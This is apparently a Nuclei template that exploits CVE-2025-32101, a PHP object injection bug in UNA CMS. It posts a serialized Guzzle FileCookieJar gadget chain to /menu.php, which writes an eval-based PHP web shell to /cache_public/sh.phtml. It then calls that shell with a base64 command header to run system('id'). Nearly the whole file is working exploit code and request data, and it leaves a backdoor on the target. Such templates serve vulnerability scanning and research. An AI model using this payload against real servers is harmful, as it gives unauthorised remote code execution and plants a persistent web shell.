id: UNACMS-CVE-2025-32101-PHPObjectInjection

info:
  name: UNACMS-CVE-2025-32101-PHPObjectInjection
  author: iSee857
  severity: critical
  description: |
    UNACMS-CVE-2025-32101-PHPObjectInjection
  tags: cve,cve2025,una-cms,php,rce

variables:
  cmd: "echo '{{randstr}}'. system('id') . '{{randstr}}';"

http:
  - raw:
      - |
        POST /menu.php HTTP/1.1
        Host: {{Hostname}}
        X-Requested-With: XMLHttpRequest
        Content-Type: application/x-www-form-urlencoded

        o=sys_set_acl_level&a=SetAclLevel&level_id=1&profile_id=O%3A31%3A%22GuzzleHttp%5CCookie%5CFileCookieJar%22%3A3%3A%7Bs%3A40%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00cookies%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A27%3A%22GuzzleHttp%5CCookie%5CSetCookie%22%3A1%3A%7Bs%3A33%3A%22%00GuzzleHttp%5CCookie%5CSetCookie%00data%22%3Ba%3A2%3A%7Bs%3A7%3A%22Expires%22%3Bs%3A0%3A%22%22%3Bs%3A5%3A%22Value%22%3Bs%3A49%3A%22%3C%3Fphp+eval%28base64_decode%28%24_SERVER%5B%27HTTP_X%27%5D%29%29%3B+%3F%3E%22%3B%7D%7D%7Ds%3A41%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00filename%22%3Bs%3A23%3A%22.%2Fcache_public%2Fsh.phtml%22%3Bs%3A52%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00storeSessionCookies%22%3Bb%3A1%3B%7D

    matchers:
      - type: status
        internal: true
        status:
          - 200

  - raw:
      - |
        GET /cache_public/sh.phtml HTTP/1.1
        Host: {{Hostname}}
        X-Requested-With: XMLHttpRequest
        X: {{base64(cmd)}}

      - |
        GET /cache_public/sh.php HTTP/1.1
        Host: {{Hostname}}
        X-Requested-With: XMLHttpRequest
        X: {{base64(cmd)}}

    stop-at-first-match: true
    matchers:
      - type: word
        part: body
        words:
          - 'uid='
          - 'gid='
        condition: and

    extractors:
      - type: regex
        part: body
        internal: false
        name: id
        group: 1
        regex:
          - '{{randstr}}(.*){{randstr}}'